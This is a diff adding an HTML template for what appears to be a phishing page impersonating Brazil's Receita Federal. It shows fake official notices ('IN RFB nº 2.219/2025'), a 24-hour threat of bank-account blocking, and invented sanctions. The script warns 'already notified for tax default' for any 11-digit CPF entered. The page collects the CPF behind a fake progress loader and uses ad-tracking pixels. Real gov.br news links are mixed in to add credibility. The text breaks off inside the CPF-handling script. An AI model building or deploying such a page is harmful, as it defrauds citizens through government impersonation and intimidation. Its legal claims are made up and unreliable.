@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vd01982f3b");
+    </script>
+    {% if fb_pixel_id %}
+    <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init','{{ fb_pixel_id }}');fbq('track','PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id={{ fb_pixel_id }}&ev=PageView&noscript=1"/></noscript>
+    {% endif %}
+    <meta charset="utf-8"/>
+    <title>Consulta de Regularização - Receita Federal</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdngovbr-ds.estaleiro.serpro.gov.br/design-system/fonts/rawline/css/rawline.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,600,700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Material+Icons+Round" rel="stylesheet" />
+    <link rel="stylesheet" href="/static/rfb-header.css">
+    <style>
+        @keyframes sp { to { transform: rotate(360deg); } }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        body {
+            font-family: 'Montserrat', sans-serif;
+            max-width: 100vw;
+            overflow-x: hidden;
+        }
+        .btn-loading-state {
+            position: relative;
+            pointer-events: none;
+            opacity: 0.85;
+        }
+        .btn-loading-state .btn-spinner {
+            display: inline-block !important;
+        }
+        .btn-loading-state .btn-text {
+            visibility: hidden;
+        }
+        .btn-spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin-top: -10px;
+            margin-left: -10px;
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: sp .6s linear infinite;
+        }
+        #fullscreen-loader {
+            position: fixed;
+            inset: 0;
+            z-index: 99999;
+            background: #fff;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .penalty-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 10px 0;
+            border-bottom: 1px solid #e5e5e5;
+        }
+        .penalty-item:last-child {
+            border-bottom: none;
+        }
+        .govbr-consulta-card {
+            background: #ffffff;
+            border: 1px solid #e1e5eb;
+            overflow: hidden;
+        }
+        .govbr-consulta-header {
+            background: #1351B4;
+            padding: 12px 20px;
+        }
+        .govbr-consulta-title {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 14px;
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: 0.2px;
+        }
+        .govbr-consulta-body {
+            padding: 20px;
+        }
+        .govbr-consulta-desc {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 12px;
+            color: #555d68;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+        .govbr-consulta-desc strong {
+            color: #071D41;
+        }
+        .govbr-label {
+            display: block;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 12px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .govbr-input {
+            width: 100%;
+            padding: 10px 40px 10px 12px;
+            border: 1px solid #888;
+            font-size: 14px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            color: #333;
+            background: #fff;
+            outline: none;
+            transition: border-color 0.2s;
+            min-height: 44px;
+        }
+        .govbr-input:focus {
+            border-color: #1351B4;
+            box-shadow: 0 0 0 2px rgba(19, 81, 180, 0.15);
+        }
+        .govbr-input::placeholder {
+            color: #aaa;
+            font-style: normal;
+        }
+        .govbr-alert {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 11px;
+            color: #b91c1c;
+            margin-top: 8px;
+        }
+        .govbr-btn-primary {
+            width: 100%;
+            padding: 12px 16px;
+            margin-top: 16px;
+            background: #1351B4;
+            color: #ffffff;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 13px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            transition: background 0.2s;
+        }
+        .govbr-btn-primary:hover {
+            background: #0c3d8a;
+        }
+        .govbr-sancoes {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #e1e5eb;
+        }
+        .govbr-sancoes-title {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 11px;
+            font-weight: 600;
+            color: #071D41;
+            margin-bottom: 10px;
+        }
+        .govbr-sancoes-list {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .govbr-sancoes-item {
+            display: flex;
+            align-items: flex-start;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 11px;
+            color: #555d68;
+            line-height: 1.5;
+        }
+        .govbr-sancoes-num {
+            color: #1351B4;
+            font-weight: 600;
+            margin-right: 6px;
+            min-width: 18px;
+        }
+        .document-floating-section {
+            padding: 24px 12px 28px;
+            background: #F8F9FA !important;
+            border-bottom: none !important;
+            border-top: none !important;
+        }
+        .document-floating-card {
+            background: #FFFFFF !important;
+            border: 1px solid #c8cdd3 !important;
+            border-radius: 4px;
+            box-shadow:
+                0 2px 8px rgba(0, 0, 0, 0.06),
+                0 1px 3px rgba(0, 0, 0, 0.04) !important;
+            max-width: 680px;
+            margin: 0 auto;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            padding: 0;
+        }
+        .document-floating-card:hover {
+            transform: translateY(-3px);
+            box-shadow:
+                0 14px 44px rgba(0, 0, 0, 0.16),
+                0 4px 12px rgba(0, 0, 0, 0.08) !important;
+        }
+        .document-card-header {
+            background: #1351B4;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .document-card-header span {
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .document-card-body {
+            padding: 20px 24px 18px;
+            text-align: center;
+        }
+        .document-card-body .brasao-img {
+            height: 68px;
+            margin: 0 auto 8px;
+            object-fit: contain;
+        }
+        .document-card-body .doc-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #071D41;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            margin-bottom: 2px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .document-card-body .doc-subtitle {
+            font-size: 17px;
+            font-weight: 700;
+            color: #1351B4;
+            margin-bottom: 4px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .document-card-body .doc-vigencia {
+            font-size: 12px;
+            color: #555d68;
+            font-weight: 500;
+            margin-bottom: 12px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .document-card-comunicado {
+            padding: 10px 20px;
+            font-size: 11px;
+            color: #555d68;
+            line-height: 1.5;
+            border-top: 1px solid #dee2e6;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .document-card-comunicado strong {
+            color: #071D41;
+        }
+        .document-card-divider {
+            width: 50px;
+            height: 2px;
+            background: #1351B4;
+            margin: 0 auto 12px;
+            border-radius: 1px;
+        }
+        .document-card-body .doc-info {
+            font-size: 13px;
+            line-height: 1.6;
+            color: #333;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .document-card-body .doc-info strong {
+            color: #071D41;
+            font-weight: 700;
+        }
+        .document-card-body .doc-info .doc-highlight {
+            color: #C5190A;
+            font-weight: 600;
+        }
+        .document-card-footer {
+            background: #e9ecef;
+            padding: 8px 20px;
+            text-align: center;
+            border-top: 1px solid #c8cdd3;
+        }
+        .document-card-footer span {
+            font-size: 10px;
+            color: #666;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            letter-spacing: 0.3px;
+        }
+        @media (max-width: 640px) {
+            main {
+                padding: 12px 16px;
+            }
+            .max-w-2xl {
+                padding: 0 12px;
+            }
+            div[style*="text-align: center; margin-bottom: 20px"] {
+                margin-bottom: 16px;
+            }
+            #btn-abrir-consulta {
+                min-height: 48px !important;
+                padding: 12px 20px !important;
+            }
+            .document-floating-section {
+                padding: 16px 12px 20px;
+            }
+            .document-floating-card {
+                max-width: 100%;
+                margin: 0 auto;
+            }
+            .document-card-header {
+                padding: 12px 16px;
+            }
+            .document-card-body {
+                padding: 16px 16px 14px;
+            }
+            .document-card-body .brasao-img {
+                height: 56px;
+                margin: 0 auto 8px;
+            }
+            .document-card-body .doc-subtitle {
+                font-size: 15px;
+            }
+            #modal-overlay {
+                padding: 12px;
+            }
+            #modal-content {
+                max-width: 100%;
+                max-height: 85vh;
+            }
+            #modal-content > div:first-child {
+                padding: 12px 16px;
+            }
+            #modal-content > div:last-child {
+                padding: 16px 16px !important;
+            }
+            .govbr-input {
+                padding: 12px 14px;
+                font-size: 16px;
+            }
+            .govbr-btn-primary {
+                padding: 14px 16px;
+                font-size: 14px;
+                min-height: 48px;
+            }
+            .govbr-sancoes {
+                margin-top: 16px;
+                padding-top: 12px;
+            }
+            .govbr-sancoes-title {
+                font-size: 11px;
+            }
+            .govbr-sancoes-item {
+                font-size: 11px;
+            }
+            .noticias-container {
+                padding: 0 12px 32px;
+            }
+            .noticias-container h3 {
+                font-size: 18px;
+                margin-bottom: 16px;
+            }
+            .noticia-card {
+                padding: 12px 16px;
+                min-height: 48px;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+            .noticia-card h4 {
+                font-size: 13px;
+                line-height: 1.4;
+                margin: 0 0 6px;
+            }
+            .noticia-card .noticia-data {
+                font-size: 11px;
+            }
+        }
+        @media (max-width: 480px) {
+            main {
+                padding: 12px;
+            }
+            h2 {
+                font-size: 16px !important;
+            }
+            #btn-abrir-consulta {
+                min-height: 44px !important;
+                padding: 10px 16px !important;
+            }
+            .document-floating-card {
+                border-radius: 0;
+            }
+            .document-card-body .doc-title {
+                font-size: 12px;
+            }
+            .document-card-body .doc-subtitle {
+                font-size: 14px;
+            }
+            .document-card-body .doc-vigencia {
+                font-size: 11px;
+            }
+            #modal-overlay {
+                padding: 10px;
+            }
+            #modal-content {
+                max-height: 80vh;
+            }
+            #modal-content > div:first-child {
+                padding: 10px 14px;
+                min-height: 44px;
+                display: flex;
+                align-items: center;
+            }
+            #modal-content > div:first-child span:first-child {
+                font-size: 13px;
+            }
+            #modal-content > div:first-child button {
+                min-width: 32px;
+                min-height: 32px;
+            }
+            #modal-content > div:last-child {
+                padding: 12px 14px !important;
+            }
+            .govbr-input {
+                padding: 11px 12px;
+                font-size: 16px;
+                min-height: 44px;
+            }
+            .govbr-label {
+                font-size: 11px;
+            }
+            .govbr-btn-primary {
+                padding: 12px 14px;
+                font-size: 13px;
+                min-height: 44px;
+            }
+            .govbr-sancoes {
+                margin-top: 14px;
+                padding-top: 10px;
+            }
+            .govbr-sancoes-title {
+                font-size: 10px;
+                margin-bottom: 8px;
+            }
+            .govbr-sancoes-item {
+                font-size: 10px;
+                gap: 4px;
+            }
+            .govbr-sancoes-num {
+                min-width: 16px;
+            }
+            .noticia-card {
+                padding: 10px 14px;
+                min-height: 44px;
+            }
+            .noticia-card h4 {
+                font-size: 12px;
+                margin: 0 0 4px;
+            }
+            .noticia-card .noticia-data {
+                font-size: 10px;
+            }
+            .noticias-container h3 {
+                font-size: 16px;
+            }
+        }
+        @media (max-width: 360px) {
+            main {
+                padding: 8px;
+            }
+            h2 {
+                font-size: 15px !important;
+            }
+            p {
+                font-size: 12px;
+            }
+            #btn-abrir-consulta {
+                min-height: 40px !important;
+                padding: 8px 12px !important;
+                font-size: 13px !important;
+            }
+            .document-floating-section {
+                padding: 12px 8px 16px;
+            }
+            .document-floating-card {
+                margin: 0;
+            }
+            .document-card-header {
+                padding: 10px 12px;
+            }
+            .document-card-body {
+                padding: 12px 12px 10px;
+            }
+            .document-card-body .brasao-img {
+                height: 48px;
+                margin: 0 auto 6px;
+            }
+            .document-card-body .doc-title {
+                font-size: 11px;
+            }
+            .document-card-body .doc-subtitle {
+                font-size: 13px;
+            }
+            .document-card-footer {
+                padding: 6px 12px;
+            }
+            .document-card-footer span {
+                font-size: 9px;
+            }
+            #modal-overlay {
+                padding: 8px;
+            }
+            #modal-content {
+                max-height: 75vh;
+            }
+            #modal-content > div:first-child {
+                padding: 8px 10px;
+                min-height: 40px;
+            }
+            #modal-content > div:first-child span:first-child {
+                font-size: 12px;
+            }
+            #modal-content > div:first-child button {
+                min-width: 28px;
+                min-height: 28px;
+                font-size: 18px;
+            }
+            #modal-content > div:last-child {
+                padding: 10px 10px !important;
+            }
+            .govbr-consulta-body {
+                padding: 12px;
+            }
+            .govbr-consulta-desc {
+                font-size: 11px;
+                margin-bottom: 12px;
+            }
+            .govbr-label {
+                font-size: 10px;
+                margin-bottom: 4px;
+            }
+            .govbr-input {
+                padding: 10px 10px;
+                font-size: 15px;
+                min-height: 40px;
+            }
+            .govbr-btn-primary {
+                padding: 10px 10px;
+                font-size: 12px;
+                min-height: 40px;
+                margin-top: 12px;
+            }
+            .govbr-sancoes {
+                margin-top: 12px;
+                padding-top: 8px;
+            }
+            .govbr-sancoes-title {
+                font-size: 9px;
+                margin-bottom: 6px;
+            }
+            .govbr-sancoes-item {
+                font-size: 9px;
+                gap: 3px;
+            }
+            .govbr-sancoes-num {
+                min-width: 14px;
+            }
+            .noticia-card {
+                padding: 8px 12px;
+                min-height: 40px;
+            }
+            .noticia-card h4 {
+                font-size: 11px;
+                margin: 0 0 2px;
+            }
+            .noticia-card .noticia-data {
+                font-size: 9px;
+            }
+            .noticia-card .noticia-categoria {
+                font-size: 10px;
+                margin-bottom: 4px;
+            }
+            .noticias-container {
+                padding: 0 10px 24px;
+            }
+            .noticias-container h3 {
+                font-size: 15px;
+                margin-bottom: 12px;
+            }
+        }
+        @media (min-width: 640px) {
+            .document-floating-section {
+                padding: 32px 24px 36px;
+            }
+            .document-card-body {
+                padding: 24px 40px 20px;
+            }
+            .document-card-body .doc-subtitle {
+                font-size: 19px;
+            }
+        }
+        .popup-flutuante {
+            position: fixed;
+            bottom: 20px;
+            left: 16px;
+            right: 16px;
+            background: #ffffff;
+            padding: 12px 16px;
+            font-size: 12px;
+            z-index: 9998;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            color: #333;
+            text-align: left;
+            border: 1px solid #c8cdd3;
+            border-left: 3px solid #1351B4;
+            box-shadow: 0 4px 12px rgba(0,0,0,.12);
+            max-width: 420px;
+            line-height: 1.5;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+            pointer-events: none;
+        }
+        .popup-flutuante.visible {
+            opacity: 1;
+            transform: translateY(0);
+            pointer-events: auto;
+        }
+        @media (min-width: 640px) {
+            .popup-flutuante {
+                left: 50%;
+                right: auto;
+                margin-left: -210px;
+            }
+        }
+        @media (max-width: 639px) {
+            .popup-flutuante {
+                left: 12px;
+                right: 12px;
+                bottom: 16px;
+                max-width: none;
+                font-size: 11px;
+                padding: 10px 12px;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <h1 style="display:none;">Consulta CPF Receita Federal 2026 – Regularização imediata online</h1>
+    {% include 'rfb_header.html' %}
+
+    <div class="px-4" style="background:#fff;">
+        <div class="max-w-2xl mx-auto py-3">
+            <nav style="display:flex;align-items:center;gap:6px;font-size:12px;font-family:'Inter','Rawline',sans-serif;white-space:nowrap;overflow-x:auto;scrollbar-width:none;">
+                <a href="/" style="color:#1351B4;"><i class="fas fa-home" style="font-size:12px;"></i></a>
+                <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                <a href="/" style="color:#1351B4;text-decoration:none;">Ministério da Fazenda</a>
+                <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                <a href="/" style="color:#1351B4;text-decoration:none;">Receita Federal do Brasil</a>
+                <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                <span style="color:#555d68;">Consulta CPF</span>
+            </nav>
+        </div>
+    </div>
+    <hr style="border:none;border-top:1px solid #e1e5eb;margin:0;">
+    
+    <main class="py-6 px-4">
+        <div class="max-w-2xl mx-auto">
+
+            <div style="margin-bottom: 24px; font-family: 'Rawline', 'Inter', sans-serif; text-align: center;">
+                <img src="/static/brasao-republica.png" alt="Brasão da República" style="width: 120px; height: auto; margin: 0 auto 12px; max-width: 100px;">
+                <p style="font-size: 11px; font-weight: 700; color: #071D41; letter-spacing: 0.5px; margin-bottom: 2px;">MINISTÉRIO DA FAZENDA & RECEITA FEDERAL – Comunicado Oficial nº 2.219/2025</p>
+                <p style="font-size: 16px; font-weight: 700; color: #1351B4; margin-bottom: 2px;">Normativa (IN) RFB nº 2.219/2025</p>
+                <p style="font-size: 10px; color: #888; margin-bottom: 16px;">Entrou em vigor em 01/01/2026 – Multa já aplicada em R$ 1,2 bilhões</p>
+
+                <h2 style="font-size: 18px; font-weight: 700; color: #071D41; margin-bottom: 12px; line-height: 1.3;">
+                    Intimação Final – Regularize seu CPF em até 24h ou será bloqueado
+                </h2>
+                <div style="text-align: left;">
+                    <p style="font-size: 12.5px; color: #333; line-height: 1.75; margin-bottom: 10px;">
+                        Se você recebeu SMS, WhatsApp ou carta nesta semana, seu CPF já foi incluído na lista de inadimplência de alta prioridade da Receita. A inclusão ocorre em tempo real e não admite recurso fora do prazo.
+                    </p>
+                    <p style="font-size: 12.5px; color: #333; line-height: 1.75;">
+                        <strong style="color: #071D41;">Restam agora menos de 24h para regularizar</strong>. Após o encerramento, a Receita Federal iniciará bloqueio de contas, suspensão de crédito e inclusão em cadastro restritivo — <strong style="color: #071D41;">Não haverá segunda notificação – o bloqueio começa automaticamente</strong>.
+                    </p>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin-bottom: 20px;">
+                <button id="btn-abrir-consulta" style="
+                    font-family: 'Rawline', 'Inter', sans-serif;
+                    font-size: 14px;
+                    font-weight: 600;
+                    color: #fff;
+                    background: #1351B4;
+                    border: none;
+                    padding: 14px 40px;
+                    cursor: pointer;
+                    letter-spacing: 0.3px;
+                    width: 100%;
+                    max-width: 360px;
+                    position: relative;
+                "><span class="btn-text">Consultar CPF Agora – Evite o Bloqueio</span><span class="btn-spinner"></span></button>
+            </div>
+
+            <div style="margin-top: 28px; border-top: 1px solid #e1e5eb; padding-top: 24px; text-align: center;">
+                <img src="https://servicos.receitafederal.gov.br/assets/images/banner-portserv.png" alt="Banner Receita Federal" style="width: 100%; max-width: 640px; height: auto;">
+            </div>
+
+            <div id="modal-overlay" style="
+                display: none;
+                position: fixed;
+                top: 0; left: 0; right: 0; bottom: 0;
+                background: rgba(0,0,0,0.45);
+                z-index: 9999;
+                justify-content: center;
+                align-items: center;
+                padding: 16px;
+            ">
+                <div id="modal-content" style="
+                    background: #fff;
+                    width: 100%;
+                    max-width: 480px;
+                    max-height: 90vh;
+                    overflow-y: auto;
+                    font-family: 'Rawline', 'Inter', sans-serif;
+                    position: relative;
+                ">
+                    <div style="background: #071D41; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center;">
+                        <span style="color: #fff; font-size: 14px; font-weight: 600;">Consulta de Regularização Fiscal</span>
+                        <button id="btn-fechar-modal" style="background: none; border: none; color: #fff; font-size: 20px; cursor: pointer; padding: 0; line-height: 1;">&times;</button>
+                    </div>
+
+                    <div style="padding: 24px 20px;">
+                        <p style="font-size: 12.5px; color: #333; line-height: 1.6; margin-bottom: 18px;">
+                            Digite seu CPF para verificar possíveis pendências relacionadas à <strong style="color: #071D41;">Normativa RFB nº 2.219/2025</strong>.
+                        </p>
+
+                        <label style="font-size: 12px; font-weight: 600; color: #071D41; display: block; margin-bottom: 6px;">CPF do Contribuinte</label>
+                        <div class="relative">
+                            <input 
+                                type="tel" 
+                                id="cpf-input"
+                                placeholder="000.000.000-00"
+                                maxlength="14"
+                                inputmode="numeric"
+                                style="
+                                    width: 100%;
+                                    padding: 12px 14px;
+                                    border: 1px solid #ccc;
+                                    font-size: 14px;
+                                    font-family: 'Inter', 'Rawline', sans-serif;
+                                    color: #333;
+                                    box-sizing: border-box;
+                                    outline: none;
+                                "
+                            />
+                        </div>
+                        <p id="notificacao-fiscal" style="display: none; font-size: 11px; color: #C5190A; margin-top: 8px; font-weight: 600;">
+                            <i class="fas fa-exclamation-triangle" style="margin-right: 4px;"></i>
+                            Cidadão já notificado por inadimplência Fiscal.
+                        </p>
+
+                        <button id="btn-continuar" style="
+                            width: 100%;
+                            padding: 14px;
+                            background: #1351B4;
+                            color: #fff;
+                            border: none;
+                            font-size: 14px;
+                            font-weight: 600;
+                            font-family: 'Rawline', 'Inter', sans-serif;
+                            cursor: pointer;
+                            margin-top: 16px;
+                            letter-spacing: 0.3px;
+                            position: relative;
+                        "><span class="btn-text">Consultar Situação Fiscal</span><span class="btn-spinner"></span></button>
+
+                        <div style="margin-top: 20px; padding-top: 16px; border-top: 1px solid #e1e5eb;">
+                            <p style="font-size: 11px; font-weight: 600; color: #071D41; margin-bottom: 10px;">Sanções Previstas — Art. 9º da IN RFB nº 2.219/2025</p>
+                            <div style="font-size: 11px; color: #555; line-height: 1.7;">
+                                <div style="display: flex; gap: 6px; margin-bottom: 4px;">
+                                    <span style="font-weight: 700; color: #1351B4; min-width: 18px;">I.</span>
+                                    <span>Bloqueio cautelar de contas bancárias vinculadas ao CPF irregular;</span>
+                                </div>
+                                <div style="display: flex; gap: 6px; margin-bottom: 4px;">
+                                    <span style="font-weight: 700; color: #1351B4; min-width: 18px;">II.</span>
+                                    <span>Suspensão de operações de crédito junto a instituições financeiras;</span>
+                                </div>
+                                <div style="display: flex; gap: 6px; margin-bottom: 4px;">
+                                    <span style="font-weight: 700; color: #1351B4; min-width: 18px;">III.</span>
+                                    <span>Multa de até 150% sobre o valor das transações não declaradas;</span>
+                                </div>
+                                <div style="display: flex; gap: 6px;">
+                                    <span style="font-weight: 700; color: #1351B4; min-width: 18px;">IV.</span>
+                                    <span>Inclusão do CPF em cadastro restritivo da Receita Federal.</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+    </main>
+
+    <style>
+        .noticias-container { max-width: 672px; margin: 0 auto; padding: 0 16px 40px; font-family: 'Rawline', 'Inter', sans-serif; }
+        .noticias-container h3 { font-size: 20px; font-weight: 800; color: #000; margin-bottom: 20px; text-align: left; }
+        .noticias-grid-container { display: flex; flex-direction: column; gap: 16px; }
+        .noticia-card {
+            background: #fff;
+            border-radius: 0;
+            padding: 14px 18px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1);
+            cursor: pointer;
+        }
+        .noticia-card .noticia-categoria {
+            font-size: 12px;
+            font-weight: 400;
+            color: #333;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .noticia-card .noticia-categoria:empty { display: none; }
+        .noticia-card h4 {
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1.5;
+            margin: 0 0 8px;
+        }
+        .noticia-card h4 a {
+            color: #1351B4;
+            text-decoration: underline;
+        }
+        .noticia-card .noticia-data {
+            font-size: 12px;
+            color: #888;
+            font-weight: 400;
+            display: block;
+        }
+        .noticias-mais {
+            text-align: center;
+            margin-top: 28px;
+        }
+        .noticias-mais a {
+            text-decoration: none;
+            color: #1351B4;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+    </style>
+    <div class="noticias-container">
+        <h3>Notícias</h3>
+        <div class="noticias-grid-container">
+
+            <div class="shadow-md noticia-card" onclick="document.getElementById('modal-overlay').style.display='flex';setTimeout(()=>document.getElementById('cpf-input').focus(),100);">
+                <label class="noticia-categoria"></label>
+                <h4><a href="javascript:void(0)"> Receita Federal intensifica fiscalização sobre transações PIX e cartões de crédito não declaradas — contribuintes têm prazo final para regularização </a></h4>
+                <label class="noticia-data">20/02/2026 08:00</label>
+            </div>
+
+            <div class="shadow-md noticia-card" onclick="document.getElementById('modal-overlay').style.display='flex';setTimeout(()=>document.getElementById('cpf-input').focus(),100);">
+                <label class="noticia-categoria"></label>
+                <h4><a href="javascript:void(0)"> Mais de 200 mil contribuintes foram penalizados com multa de 2 a 5 vezes o valor do débito, restrições no CPF e bloqueio de contas por não regularização fiscal </a></h4>
+                <label class="noticia-data">19/02/2026 14:22</label>
+            </div>
+
+            <div class="shadow-md noticia-card" onclick="window.open('https://www.gov.br/receitafederal/pt-br/assuntos/noticias/2026/fevereiro/consulta-ao-lote-residual-de-restituicao-do-irpf-de-fevereiro-sera-aberta-nesta-sexta-feira-20-02','_blank')">
+                <label class="noticia-categoria"></label>
+                <h4><a href="javascript:void(0)"> Receita Federal alerta sobre proximidade do fim do prazo para atualização de bens móveis e imóveis co... </a></h4>
+                <label class="noticia-data">13/02/2026 16:50</label>
+            </div>
+
+            <div class="shadow-md noticia-card" onclick="window.open('https://www.gov.br/receitafederal/pt-br/assuntos/noticias/2026/fevereiro/receita-federal-prorroga-para-20-de-marco-o-prazo-para-adesao-a-primeira-edicao-do-programa-confia','_blank')">
+                <label class="noticia-categoria">RTC</label>
+                <h4><a href="javascript:void(0)"> Reforma Tributária: Receita Federal disponibiliza manuais e leiautes da nova Declaração de Regimes... </a></h4>
+                <label class="noticia-data">10/02/2026 15:39</label>
+            </div>
+
+        </div>
+        <div class="noticias-mais">
+            <a href="https://www.gov.br/receitafederal/pt-br/assuntos/noticias" target="_blank" rel="noopener">
+                <i class="fas fa-newspaper"></i>
+                Mais Notícias
+            </a>
+        </div>
+    </div>
+
+    <div id="fullscreen-loader" style="position:fixed;inset:0;z-index:99999;background:#fff;display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px;">
+        <img src="/static/logo-receita.png" alt="Receita Federal" style="width:120px;margin-bottom:24px;opacity:0.9">
+        <p id="load-text" style="font-size:14px;font-weight:600;color:#333;font-family:Inter,sans-serif;margin:0 0 16px;text-align:center;max-width:400px;line-height:1.5;">Localizando informações vinculadas ao CPF...</p>
+        <div style="width:80%;max-width:360px;height:8px;background:#e0e0e0;border-radius:4px;overflow:hidden;">
+            <div id="progress-bar" style="height:100%;background:#1351B4;width:0%;border-radius:4px;transition:width 0.1s linear;"></div>
+        </div>
+        <div id="progress-percent" style="font-size:13px;color:#1351B4;font-weight:600;margin-top:8px;">0%</div>
+    </div>
+
+    <div class="mt-8">
+        {% include 'rfb_footer.html' %}
+    </div>
+
+    <script>
+        const modalOverlay = document.getElementById('modal-overlay');
+        const btnAbrir = document.getElementById('btn-abrir-consulta');
+        const btnFechar = document.getElementById('btn-fechar-modal');
+        const cpfInput = document.getElementById('cpf-input');
+        const btnContinuar = document.getElementById('btn-continuar');
+        const notificacaoFiscal = document.getElementById('notificacao-fiscal');
+
+        btnAbrir.addEventListener('click', function() {
+            modalOverlay.style.display = 'flex';
+            setTimeout(() => cpfInput.focus(), 100);
+        });
+
+        btnFechar.addEventListener('click', function() {
+            modalOverlay.style.display = 'none';
+        });
+
+        modalOverlay.addEventListener('click', function(e) {
+            if (e.target === modalOverlay) {
+                modalOverlay.style.display = 'none';
+            }
+        });
+
+        cpfInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+
+            let formatted = value;
+            if (value.length > 9) {
+                formatted = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                formatted = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                formatted = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+            }
+
+            e.target.value = formatted;
+
+            if (value.length === 11) {
+                notificacaoFiscal.style.display = 'block';
+            } else {
+                notificacaoFiscal.style.display = 'none';
+            }
+        });
+
+        cpfInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                navegarParaCPF();
+                return;
+            }
+            if (!/[0-9]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        btnContinuar.addEventListener('click', navegarParaCPF);
+
+        function navegarParaCPF() {
+            const cpf = cpfInput.value.replace(/\D/g, '');
+            if (cpf.length === 11) {
+                btnContinuar.classList.add('btn-loading-state');
+                btnAbrir.classList.add('btn-loading-state');
+
+                var cpfMask = cpf.slice(0,3)+'.'+cpf.slice(3,6)+'.***-'+cpf.slice(9,11);
+                var loadText = document.getElementById('load-text');
+                var progressBar = document.getElementById('progress-bar');
+                var progressPercent = document.getElementById('progress-percent');
+
